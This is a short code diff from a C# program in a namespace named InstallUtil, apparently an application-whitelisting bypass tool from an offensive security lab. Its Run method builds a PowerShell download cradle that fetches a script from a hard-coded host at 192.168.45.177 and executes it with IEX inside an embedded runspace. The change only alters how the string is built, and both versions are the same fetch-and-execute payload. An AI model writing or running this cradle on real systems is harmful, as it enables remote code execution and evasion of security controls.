@@ -29,7 +29,7 @@ namespace InstallUtil
 
         private void Run(PowerShell ps, String resource)
         {
-            String cmd = $"(New-Object System.Net.WebClient).DownloadString('http://192.168.45.177/{resource}') | IEX";
+            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.177/" + resource + "') | IEX";
             ps.AddScript(cmd);
             var results = ps.Invoke();
             foreach (PSObject result in results)
